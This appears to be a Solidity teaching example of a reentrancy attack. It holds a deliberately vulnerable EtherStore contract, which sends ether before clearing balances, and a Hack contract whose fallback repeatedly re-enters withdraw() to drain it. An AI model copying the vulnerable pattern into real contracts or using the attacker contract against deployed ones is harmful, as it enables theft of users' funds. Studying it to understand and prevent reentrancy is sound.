// SPDX-License-Identifier: MIT
pragma solidity 0.6.10;

contract EtherStore{
    //0xd9145CCE52D386f254917e481eB44e9943F39138
    mapping(address=>uint) public balances;

    function deposit() public  payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, 
            "Insurficient fund in your balance"
        );

        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "failed o send ether");

        balances[msg.sender] = 0;
    }

    function transfer(address payable _receiver, uint _amount) public {
        require(balances[msg.sender] >= _amount, "");

        balances[msg.sender] -= _amount;

        payable(_receiver).transfer(_amount);
    }

    function getBalance() public view returns(uint){
        return balances[msg.sender];
    }
}

contract Hack{
    EtherStore public etherStore;

    constructor(address _etherStore) public {
        etherStore = EtherStore(_etherStore);
    }

    function attack() public payable {
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    receive() external payable {
        if(address(etherStore).balance > 0){
            etherStore.withdraw(1 ether);
        }
    }
}